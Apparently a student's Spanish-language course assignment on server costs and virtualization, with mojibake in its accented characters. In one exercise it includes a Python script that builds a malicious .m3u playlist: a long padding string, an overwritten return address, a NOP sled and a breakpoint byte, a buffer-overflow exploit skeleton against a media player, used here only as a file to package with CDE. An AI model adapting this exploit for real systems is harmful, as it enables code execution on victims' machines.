#Tema 1#

##Ejercicio 1##


He seleccionado el servidor [Netgear RN31400 readynas 314 nas 4hd] (http://www.pccomponentes.com/netgear_rn31400_readynas_314_nas_4hd.html?gclid=CNWTztLJ58gCFUPnwgod3d8P8A)

Siguiendo la tabla de la agencia tributaria:

- coef. max. = 26%
- periodo max. = 10

C�mo nos da el periodo m�ximo, utilizamos el coeficiente m�nimo y dividimos el precio entre este �ltimo:

Precio = 579�

coef. min. = 579/10 = 57,9

Lo multiplicamos por 4 y 7 para obtener el coste de amortizaci�n:

C.A. de 4 a�os:
57,9*4 = 231,6

C.A. de 7 a�os:
57,9*7 = 405,9

##Ejercicio 2##

Servidor de prop�sito general del provedor rackspace:
- 2 gb de ram
- 2 cores
- 400 gb de transferencia

coste anual = 510,76
con uso del 1% = 5,10
con uso del 10% = 51,076

Servidor de prop�sito general del provedor acens:
- 2 gb de ram
- 2 cores
- 400 gb de transferencia

coste anual = 2452,8
con uso del 1% = 24,5
con uso del 10% = 245,2

##Ejercicio 3##

###Apartado 1###

Para probar distintos sistemas operativos, se usar�a la virtualizaci�n plena ya que con ella 
se tiene un sistema completo. Yo suelo utilizar la herramienta VMware.

Para dar servicio de almacenamiento a varios clientes, utilizar�amos la virtualizaci�n parcial
ya que s�lo virtualizar�amos un recurso, el disco duro.

Para alojar varios clientes en un servidor, utilizar�amos la virtualizaci�n a nivel de sistema 
operativo para aislar las cuentas de cada usuario por separado.

Para el desarrollo de programas utilizar�amos la virtualizaci�n de entornos de desarrollo, para reproducir
cada entorno, de la forma m�s semejante posible y as� poder probar nuestro programa en �l.

Para la ejecuci�n de programas exclusivos de otros sistemas operativos, utilizar�amos la virtualizaci�n de aplicaciones
empaquetando las aplicaciones para aislar su entorno de ejecuci�n del resto del sistema operativo. En mi caso utilzo
la herramienta Eclipse dentro de la cual viene un emulador de android, que me permite ejecutar Whatsapp.

###Apartado 2###

He utilizado el siguiente script escrito en python para empaquetarlo con CDE.

<script>
from struct import *

file = open('revienta.m3u', 'w')

a = 'A' * 26053
eip = pack('<L',0x002c1000)
esp = '\x90'*25 + '\xcc' + '\x90'*25

print eip
print esp

file.write(a+eip+esp)

file.close()

print("Archivo creado con exito!")
</script>

Una vez instalado CDE, ejecutamos el siguiente comando: ./cde python script.py para empaquetarlo,
y obtenemos el paquete "python.cde".
Ahora podemos ejecutar el script con "./python.cde".

Lo he probado en mis dos MMVV: Kali linux y Ubuntu.

Nota: La etiqueta <script></script> la he utilizado para delimitar el c�digo del mismo.

##Ejercicio 4##

Ejecutando en un S.O. Ubuntu el comando "egrep '^flags.*(vmx)' /proc/cpuinfo" me aparece
los flags activados del cpu, entre ellos vmx.

El procesador es un intel core i7-4820k 3.7 Ghz.

##Ejercicio 5##

El KMV, al ser una MV no lo tengo activado.

Para virtualizar utilizo la herramienta VMware y lo hago bajo windows, ya que mi placa base
no me permite cargar el grub y me da muchos problemas para arrancar cualquier linux.
